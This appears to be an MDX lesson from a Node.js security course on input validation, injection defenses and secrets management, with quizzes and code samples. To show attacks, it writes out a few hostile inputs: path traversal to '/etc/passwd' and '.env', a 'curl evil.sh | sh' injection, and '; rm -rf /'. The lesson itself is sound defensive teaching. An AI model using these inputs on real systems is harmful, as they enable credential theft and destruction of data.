---
concepts:
- schema-validation
- parse-dont-validate
- injection-defense
- parameterized-queries
- command-injection
- secrets-management
deepensInto: []
estMin: 19
lang: en
lessonType: topic
level: senior
order: 1
prereqs: []
slug: 01-input-and-secrets
sources:
- https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html
- https://owasp.org/www-project-top-ten/
- https://nodejs.org/api/cli.html#--env-fileconfig
spiral: []
status: ready
summary: 'Every external input is hostile until a schema at the boundary turns it
  into a typed value. Each injection class has one defense: parameterized queries,
  an argument array instead of a shell, a base-dir check for paths, bounded input
  for ReDoS. Secrets stay in env and out of git.'
title: 'Input validation and handling secrets'
track: node
unit: 07-security
---



import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import DragOrder from "~/components/pedagogy/DragOrder.astro";
import TradeoffMatrix from "~/components/pedagogy/TradeoffMatrix.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
An internal admin endpoint took a `?file=` query param and did `res.send(await readFile("./reports/" + req.query.file))`. It shipped on a Friday. By Monday someone had requested `?file=../../../../etc/passwd` and walked straight out of the reports directory, then `?file=../../.env` and pulled the production database password — which had been committed to the repo a year earlier and was still valid. Two separate sins compounded: user input concatenated into a file path, and a secret that lived in git history forever. Neither was an exotic exploit. Both were the absence of a single boundary that should have rejected, resolved, and refused.
</Hook>

<Crux>Validate every input with a schema at the boundary, parameterize queries, never build a shell command from input, keep secrets in env.</Crux>

<Explanation>

## Validate at the boundary, parse don't validate

Treat every byte that crosses your process edge — request body, query string, route params, headers, even environment variables — as hostile until proven otherwise. The senior discipline is **parse, don't validate**: at the door, run the raw input through a *schema* (zod, ajv, Joi) that asserts type, range, length, and an allowlist of shapes, and hand the rest of the code a *typed value* it can trust. If the input doesn't match, **reject it** with a 400 — don't silently "sanitize" by stripping characters, because sanitization quietly mutates attacker input into something that may still be dangerous and is now also wrong.

```ts
import { z } from "zod";

const CreateUser = z.object({
  email: z.string().email().max(254),
  age: z.number().int().min(13).max(120),
  role: z.enum(["member", "admin"]), // allowlist, not a freeform string
});

app.post("/users", (req, res) => {
  const parsed = CreateUser.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid" });
  createUser(parsed.data); // parsed.data is fully typed and trusted
});
```

One more boundary control belongs here: **cap the body size**. An unbounded JSON body lets an attacker send hundreds of megabytes and exhaust memory — a trivial denial-of-service. Set a limit (`express.json({ limit: "100kb" })`) so the parser rejects oversized payloads before they reach your heap.

## The injection family: one defense per kind

Most of the OWASP Top 10's "Injection" category collapses to one rule: **never let untrusted data become code.** Each channel has exactly one correct defense, and they are not interchangeable.

<div data-lesson-visual class="overflow-x-auto my-6">
  <table class="w-full text-sm border-collapse">
    <thead>
      <tr class="bg-surface-2">
        <th class="border border-border px-3 py-2 text-left">Threat</th>
        <th class="border border-border px-3 py-2 text-left">Vector</th>
        <th class="border border-border px-3 py-2 text-left">The one defense</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td class="border border-border px-3 py-2">SQL injection</td>
        <td class="border border-border px-3 py-2">input concatenated into a query string</td>
        <td class="border border-border px-3 py-2">parameterized queries / prepared statements</td>
      </tr>
      <tr class="bg-surface-2">
        <td class="border border-border px-3 py-2">Command injection</td>
        <td class="border border-border px-3 py-2"><code>exec</code> with an interpolated shell string</td>
        <td class="border border-border px-3 py-2"><code>execFile</code>/<code>spawn</code> + argument array, no shell</td>
      </tr>
      <tr>
        <td class="border border-border px-3 py-2">Path traversal</td>
        <td class="border border-border px-3 py-2"><code>req.params.file</code> joined into a path</td>
        <td class="border border-border px-3 py-2"><code>path.resolve</code> + verify under an allowed base</td>
      </tr>
      <tr class="bg-surface-2">
        <td class="border border-border px-3 py-2">ReDoS</td>
        <td class="border border-border px-3 py-2">catastrophic regex on attacker input</td>
        <td class="border border-border px-3 py-2">linear patterns + bound input length</td>
      </tr>
    </tbody>
  </table>
</div>

For **SQL**, the fix is parameterized queries: the driver sends the query text and the values over separate channels, so the database never parses your data as syntax. For **shell commands**, avoid a shell entirely — `child_process.execFile`/`spawn` with an *argument array* passes each arg as a literal, so a value like `; rm -rf /` is just a weird filename, not a second command. For **paths**, resolve to an absolute path and confirm it still lives under your base directory. For **ReDoS**, a nested-quantifier regex like `/^(a+)+$/` can backtrack catastrophically on a long crafted string and pin the single thread for seconds to minutes.

```js
import { execFile } from "node:child_process";
import path from "node:path";

// ✅ SQL: values travel separately from the query text
await db.query("SELECT * FROM users WHERE email = $1", [email]);

// ✅ command: arg array, no shell — input can never become a new command
execFile("convert", [userPath, "-resize", "100x100", outPath]);

// ✅ path: resolve, then prove it stays under the base dir
const base = path.resolve("./reports");
const full = path.resolve(base, req.params.file);
if (!full.startsWith(base + path.sep)) return res.sendStatus(400);
```

<Inset kind="why" lang="en">
Why is `spawn(..., { shell: true })` dangerous when the array form is safe? With `shell: true` (and always with `exec`), Node hands your string to `/bin/sh -c`, which re-parses it — so `;`, `|`, `$()`, and backticks become shell metacharacters again, and `file.txt; curl evil.sh | sh` runs two commands. The argument array bypasses the shell: the kernel `execve`s the binary directly with each array element as one untouched `argv` entry. No re-parsing, no metacharacters, no injection surface.
</Inset>

## Secrets: env in, never in git

A secret is anything that grants access — DB passwords, API keys, signing keys, tokens. The non-negotiable rules: **never hardcode and never commit them.** Read configuration from `process.env`; for local development, load a `.env` file with Node's built-in `node --env-file=.env` (available since **Node 20.6**) or the `dotenv` package — and add `.env` to `.gitignore` so it never enters the repo.

```bash
# local dev: load env without any dependency (Node 20.6+)
node --env-file=.env server.js
```

```js
// read at startup; fail fast if a required secret is missing
const dbUrl = process.env.DATABASE_URL;
if (!dbUrl) throw new Error("DATABASE_URL is not set");
```

In production, don't ship `.env` at all — use a **secrets manager** (HashiCorp Vault, AWS Secrets Manager, Doppler) that injects values at runtime, so secrets are never at rest in your image or repo. Three habits separate a hardened service: **don't log secrets** (redact tokens before they hit a log line), **rotate on exposure** (a committed `.env` is a *permanent* leak — it lives in git history even after you delete the file, so you must rotate the credential, not just `git rm` it), and apply **least privilege** so a leaked token can do as little as possible.

<TradeoffMatrix
  id="07-input-and-secrets-tradeoff-1"
  lessonSlug="01-input-and-secrets"
  lang="en"
  prompt="A service must run an external image tool on a filename that came from a user upload. Which way of invoking it is safe?"
  options={[
    { name: "execFile('convert', [userFile, '-resize', '100x100', out]) — argument array, no shell", summary: "Args are literals.", correct: true, justification: "This is the correct default. execFile (and spawn) with an array execve's the binary directly: each element becomes one untouched argv entry, so the kernel never re-parses the value. A filename like 'a.png; rm -rf /' is passed as a single literal argument — a weird name, not a second command. There is no shell, so there are no metacharacters and no injection surface, regardless of what the user typed." },
    { name: "exec(`convert ${userFile} -resize 100x100 ${out}`) — string with interpolation", summary: "Shell re-parses it.", justification: "exec runs the string through /bin/sh -c, which re-parses metacharacters. The interpolated user value can carry ; | $() or backticks, turning one command into many — 'a.png; curl evil.sh | sh' executes attacker code. This is the canonical command-injection bug; interpolating untrusted data into a shell string is never safe." },
    { name: "spawn('convert', [userFile, ...], { shell: true })", summary: "shell:true re-parses too.", justification: "shell:true defeats the entire benefit of the array form: Node routes the whole invocation back through /bin/sh, which re-parses metacharacters in the arguments. You're back to command injection. The array form is only safe WITHOUT shell:true — the moment a shell is in the path, untrusted input can break out." },
    { name: "exec on the string but escape ; and | in userFile first", summary: "Blocklist escaping.", justification: "Hand-rolled shell escaping is a blocklist, and blocklists for shell metacharacters are notoriously incomplete — newlines, $(), backticks, globbing, locale quirks, and quoting edge cases slip through. The correct move is to remove the shell from the equation with an argument array, not to try to out-escape a shell parser." },
  ]}
/>

<Quiz
  id="07-input-and-secrets-quiz-1"
  lessonSlug="01-input-and-secrets"
  lang="en"
  question="Why does a parameterized query (db.query('... WHERE email = $1', [input])) stop SQL injection, while string concatenation does not?"
  choices={[
    { label: "The driver sends the query text and the parameter values over separate channels, so the database parses your SQL once and then binds the values as data — attacker input can never be interpreted as SQL syntax", correct: true },
    { label: "The driver scans the values for SQL keywords like DROP and removes them", misconception: "Parameterization is not keyword filtering — it never inspects your data for 'bad words'. The value 'DROP TABLE' is stored verbatim and harmlessly; safety comes from values being bound as data, separate from the already-parsed query, not from blocklisting." },
    { label: "It wraps each value in quotes for you so the string is valid SQL", misconception: "Auto-quoting is exactly the fragile escaping that injection exploits. Parameterized queries don't build a SQL string at all — the value never becomes part of the query text, so there are no quotes to escape out of." },
    { label: "It runs the query in a read-only transaction", misconception: "Parameterization has nothing to do with transactions or read-only mode. A parameterized INSERT or DELETE still writes; the protection is that the input is bound as data, not parsed as syntax." },
  ]}
/>

<Quiz
  id="07-input-and-secrets-quiz-2"
  lessonSlug="01-input-and-secrets"
  lang="en"
  question="You need to run a CLI tool on a user-supplied argument. Why is execFile('tool', [userArg]) safer than exec(`tool ${userArg}`)?"
  choices={[
    { label: "execFile runs the binary directly with each array element as one literal argv entry — no shell is involved, so metacharacters like ; | $() in userArg are passed as data, not re-parsed as new commands", correct: true },
    { label: "execFile automatically escapes shell metacharacters in the arguments", misconception: "There's nothing to escape because there is no shell. execFile (without shell:true) execve's the binary directly; the argument array bypasses /bin/sh entirely rather than escaping for it." },
    { label: "execFile is faster, and speed is what prevents the injection", misconception: "Performance is irrelevant to injection. The safety comes from removing the shell from the call path so untrusted input can never become a second command — not from how quickly the child starts." },
    { label: "exec is deprecated and execFile replaced it", misconception: "exec is not deprecated; both exist for different uses. The point is semantic: exec spawns a shell that re-parses the string, while execFile with an array does not — that's why one is injectable and the other is not." },
  ]}
/>

<DragOrder
  id="07-input-and-secrets-drag-1"
  lessonSlug="01-input-and-secrets"
  lang="en"
  prompt="Order how a request enters a hardened endpoint, from the edge inward:"
  items={[
    { id: "a", label: "Cap the body size so an oversized payload is rejected before parsing" },
    { id: "b", label: "Schema-validate the parsed body, rejecting invalid input with a 400" },
    { id: "c", label: "Use the now-typed value in a parameterized query — never string-concatenated SQL" },
    { id: "d", label: "Run any external command with execFile + an argument array, no shell" },
    { id: "e", label: "Act with a least-privilege token read from env, never a hardcoded secret" },
  ]}
  correctOrder={["a", "b", "c", "d", "e"]}
/>

</Explanation>

<FlowDiagram
  label="Untrusted input crossing the boundary into a typed value and safe execution"
  hue="var(--d-systems)"
  perRow={4}
  nodes={[
    { id: "i", label: "untrusted input", sub: "body / query / env" },
    { id: "v", label: "schema validate", sub: "boundary" },
    { id: "t", label: "typed value", sub: "trusted" },
    { id: "s", label: "safe execution", sub: "param / arg array" },
  ]}
  edges={[
    { from: "i", to: "v", label: "reject bad" },
    { from: "v", to: "t", label: "parse" },
    { from: "t", to: "s" },
  ]}
  caption="Every external input is hostile until a schema at the boundary parses it into a typed value and rejects what fails. Only that trusted value flows into safe execution — parameterized queries, an argument array instead of a shell, a base-dir check for paths — while secrets arrive from env, never from source."
/>

<KeyTakeaway>Treat all external input as hostile: parse it into a typed value with a schema at the edge and reject what fails. Parameterize queries, pass an arg array not a shell, check a base dir for paths, secrets in env not git.</KeyTakeaway>

<RetrievalDrawer
  client:load
  id="07-input-and-secrets-retrieval"
  lang="en"
  questions={[
    { q: "Why is deleting a committed .env file not enough, and what must you do instead?", a: "Because git is a history, not a snapshot. Once a .env (or any secret) is committed, it lives forever in the repository's history — every clone, every fork, and every backup still contains the old object, and anyone with read access can check out the commit where it existed and read the value. A `git rm .env` followed by a commit only removes it from the current tip; the credential is still recoverable from history. So a committed secret is a permanent leak, and the only correct response is to ROTATE the credential — issue a new password/key/token and invalidate the old one at the source (the database, the cloud provider, the API). Rewriting history (filter-repo / BFG) can scrub the object, but you must assume it was already read and rotate regardless. Going forward, keep .env in .gitignore so it never enters the repo, and in production use a secrets manager that injects values at runtime instead of storing them in the tree at all." },
    { q: "What is the difference between validating input and sanitizing it, and why does this lesson prefer reject-on-invalid?", a: "Validation asks a yes/no question — does this input match an expected schema (type, range, length, an allowlist of shapes)? — and rejects anything that fails, usually with a 400. Sanitization instead mutates the input, stripping or escaping characters to try to make a bad value safe. The lesson prefers reject-on-invalid (parse, don't validate) for two reasons. First, sanitization is a blocklist in disguise: you can only strip the dangerous patterns you thought of, and attackers specialize in the ones you didn't (double-encoding, unicode lookalikes, nested payloads). Second, silently rewriting input means the rest of your code runs on data the caller never sent — a value that is now both possibly-still-dangerous AND semantically wrong, which hides bugs. A schema at the boundary turns raw bytes into a typed, trusted value exactly once; downstream code can then assume validity instead of re-checking, and the channel-specific defenses (parameterized queries, argument arrays) handle whatever dangerous-looking content legitimately got through." },
  ]}
/>

<Recap lang="en">
The whole of input security is one boundary: treat every external byte — body, query, params, headers, env — as hostile, and at the edge run it through a schema (zod / ajv / Joi) that asserts type, range, length, and an allowlist, rejecting what fails with a 400 rather than silently sanitizing. That turns raw input into a typed, trusted value once (parse, don't validate), and you cap body size so an oversized payload can't exhaust memory. From there, each injection class has exactly one defense: SQL → parameterized queries, where values travel separately from the query text so data is never parsed as syntax; command → `execFile`/`spawn` with an argument array and no shell, so input can't become a second command (and `shell: true` re-opens the hole); path traversal → `path.resolve` plus a check that the result stays under an allowed base dir; ReDoS → linear patterns and bounded input length, since a nested-quantifier regex can pin the single thread for seconds. Secrets follow their own discipline: read from `process.env`, load local config with `node --env-file=.env` (Node 20.6+) or dotenv while keeping `.env` in `.gitignore`, use a secrets manager in production, never log secrets, apply least privilege, and remember that a committed secret is a permanent git-history leak you must rotate, not merely delete.
</Recap>
